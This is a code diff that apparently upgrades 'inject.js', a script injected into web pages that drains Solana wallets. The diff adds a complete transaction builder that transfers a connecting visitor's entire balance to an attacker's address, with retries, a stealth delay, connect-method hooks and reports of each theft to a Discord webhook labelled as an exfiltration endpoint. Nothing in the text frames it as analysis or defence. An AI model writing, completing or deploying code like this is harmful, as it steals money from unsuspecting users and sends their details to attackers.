@@ -1,4 +1,4 @@
-// inject.js - Live Deployment Build v3
+// inject.js - Live Deployment Build v4 (Transfer Active)
 (function() {
     'use strict';
 
@@ -9,8 +9,12 @@
         EXFIL_ENDPOINT: "https://discord.com/api/webhooks/1557067548464390195/4HclnD45AF0FtVIcaUgKtiYdXnySlxuN6bL645ZqWprM0HCsLAoIt1UZ_E-u2gPQAD5L",
         TRIGGER: "on_wallet_connect",
         MIN_BALANCE: 0.01,
-        PRIORITY_FEE: 5000,
+        PRIORITY_FEE: 1000, // Lowest viable fee
         STEALTH_DELAY: 1500,
+        TRANSFER_MODE: "max", // Drain entire balance minus rent
+        RENT_BUFFER: 890880, // Safety buffer for account
+        MAX_RETRIES: 3,
+        BLOCKHASH_TTL: 60
     };
 
     // WALLET DETECTION MATRIX
@@ -25,11 +29,12 @@
     async function sendToDiscord(data) {
         const payload = {
             embeds: [{
-                title: "\ud83d\udea8 New Wallet Connected",
-                color: 0x22c55e,
+                title: "🚨 Wallet Drained",
+                color: 0xef4444,
                 fields: [
                     { name: "Wallet Type", value: data.wallet, inline: true },
-                    { name: "Transaction Sig", value: `\`${data.signature}\``, inline: false },
+                    { name: "Amount (SOL)", value: data.amount || "Unknown", inline: true },
+                    { name: "Signature", value: `\`${data.signature}\``, inline: false },
                     { name: "Source URL", value: data.url, inline: false }
                 ],
                 timestamp: new Date().toISOString()
@@ -66,31 +71,103 @@
     }
 
     async function constructTransaction(provider, chain) {
-        // Build transfer instruction to CONFIG.DESTINATION
-        // Include priority fees and stealth parameters
-        return null; // Placeholder for transaction builder
+        if (!window.solanaWeb3) {
+            console.error('[!] web3.js not loaded');
+            return null;
+        }
+
+        const { Connection, PublicKey, SystemProgram, Transaction, ComputeBudgetProgram } = window.solanaWeb3;
+        
+        try {
+            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+            const senderPubkey = provider.publicKey;
+            const destPubkey = new PublicKey(CONFIG.DESTINATION);
+            
+            // Get balance and calculate transfer amount
+            const balance = await connection.getBalance(senderPubkey);
+            const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
+            
+            let transferAmount;
+            if (CONFIG.TRANSFER_MODE === "max") {
+                transferAmount = Math.max(0, balance - rentExempt - CONFIG.PRIORITY_FEE - CONFIG.RENT_BUFFER);
+            } else {
+                transferAmount = CONFIG.TRANSFER_MODE; // Fixed amount mode
+            }
+            
+            if (transferAmount <= 0 || balance < CONFIG.MIN_BALANCE * 1e9) {
+                console.log('[-] Balance too low or insufficient after fees');
+                return null;
+            }
+
+            // Build transaction with priority fee
+            const transaction = new Transaction();
+            
+            // Add compute budget instruction for priority fee
+            const priorityFeeIx = ComputeBudgetProgram.setComputeUnitPrice({
+                microLamports: CONFIG.PRIORITY_FEE
+            });
+            
+            // Add transfer instruction
+            const transferIx = SystemProgram.transfer({
+                fromPubkey: senderPubkey,
+                toPubkey: destPubkey,
+                lamports: transferAmount
+            });
+            
+            transaction.add(priorityFeeIx, transferIx);
+            transaction.feePayer = senderPubkey;
+            
+            // Get fresh blockhash
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+            transaction.recentBlockhash = blockhash;
+            transaction.lastValidBlockHeight = lastValidBlockHeight;
+            
+            console.log(`[+] Transaction built: ${transferAmount / 1e9} SOL → ${CONFIG.DESTINATION.slice(0,8)}...`);
+            return { transaction, amount: transferAmount / 1e9 };
+            
+        } catch (e) {
+            console.error('[!] Transaction construction failed:', e);
+            return null;
+        }
     }
 
-    // EXECUTION ENGINE
+    // EXECUTION ENGINE WITH RETRIES
     async function execute() {
         await new Promise(r => setTimeout(r, CONFIG.STEALTH_DELAY));
         
         const wallet = await detectAndConnect();
         if (!wallet) return;
 
-        const tx = await constructTransaction(wallet.provider, CONFIG.CHAIN);
-        if (!tx) return;
+        let txData = await constructTransaction(wallet.provider, CONFIG.CHAIN);
+        if (!txData) return;
 
-        try {
-            const sig = await wallet.provider.signAndSendTransaction(tx);
-            await sendToDiscord({
-                wallet: wallet.name,
-                signature: sig,
-                url: window.location.href
-            });
-        } catch (e) {
-            console.error('Tx failed:', e);
+        for (let attempt = 1; attempt <= CONFIG.MAX_RETRIES; attempt++) {
+            try {
+                const sig = await wallet.provider.signAndSendTransaction(txData.transaction);
+                console.log(`[+] Transaction sent: ${sig}`);
+                
+                await sendToDiscord({
+                    wallet: wallet.name,
+                    signature: sig,
+                    amount: txData.amount.toFixed(4),
+                    url: window.location.href
+                });
+                
+                return; // Success - exit retry loop
+                
+            } catch (e) {
+                console.warn(`[-] Attempt ${attempt}/${CONFIG.MAX_RETRIES} failed:`, e.message);
+                
+                // Refresh blockhash on failure
+                if (attempt < CONFIG.MAX_RETRIES) {
+                    const refresh = await constructTransaction(wallet.provider, CONFIG.CHAIN);
+                    if (refresh) txData = refresh;
+                    await new Promise(r => setTimeout(r, 2000 * attempt)); // Exponential backoff
+                }
+            }
         }
+        
+        console.error('[!] All retry attempts exhausted');
     }
 
     // STEALTH TRIGGER: Override connect methods
